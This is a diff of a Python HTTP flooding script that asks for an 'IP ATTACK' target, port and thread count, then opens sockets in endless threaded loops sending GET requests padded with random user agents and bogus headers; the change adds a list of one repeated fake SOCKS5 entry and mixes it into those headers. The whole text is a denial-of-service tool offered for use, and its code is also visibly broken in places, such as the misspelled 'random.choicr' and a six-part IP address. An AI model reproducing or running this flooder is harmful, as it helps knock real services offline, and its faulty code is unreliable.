@@ -233,6 +233,66 @@ https://merdeka.com/
 https://merdeka.com/
 https://merdeka.com/
 https://merdeka.com/ """]
+socks5= [""" 192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/ """]
 useragents=["""Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
@@ -258,7 +318,7 @@ ip = str(input("IP ATTACK>="))
 port = int(input("PORT >= "))
 pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
-def randomip(th):
+def randomip():
   randip = [192, 168, 0, 1]
   randip1 = random.randint(3,255)
   randip2 = random.randint(3,255)
@@ -277,21 +337,21 @@ def randomip(th):
   randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5])
   return(randip)
 
-def start(th):
-  global userip, acceptall, all, useragents
+def start():
+  global userip, acceptall, all, useragents, socks5
   hh = random._urandom(999999)
-  kk = random._urandom(888888)
   xx = int(0)
   nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
+  sockall = "Socks: "+random.choice(socks5)+random.choice(all)+random.choice(userip)+random.choice(useragents)+random.choicr(acceptall)+"\r\n"
   lolall = random.choice(useragents)+random.choice(userip)+"\r\n"
-  agentall = "UserAgents: "+random.choice(useragents)+random.choice(userip)+random.choice(all)+random.choice(all)+random.choice(acceptall)+"\r\n"
+  agentall = "UserAgents: "+random.choice(useragents)+random.choice(userip)+random.choice(all)+random.choice(socks5)+random.choice(acceptall)+"\r\n"
   cekall = "Bantai: "+random.choice(all)+random.choice(userip)+random.choice(acceptall)+"\r\n"
   ipser = "IP: "+random.choice(userip)+"\r\n"
   accept = random.choice(acceptall)+"\r\n"
   content    = "Content-Type: application/x-www-form-urlencoded\r\n"
   length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
   target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-  main_req = ipser + cekall + lolall + nolakall + agentall + content + length + accept + target_host + "\r\n"
+  main_req = ipser + cekall + sockall + lolall + nolakall + agentall + content + length + accept + target_host + "\r\n"
   while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -306,5 +366,6 @@ def start(th):
             print('[+] server error')
 
 for x in range(th):
+    tt = random._urandom(100000)
     thred = threading.Thread(target=start)
     thred.start()
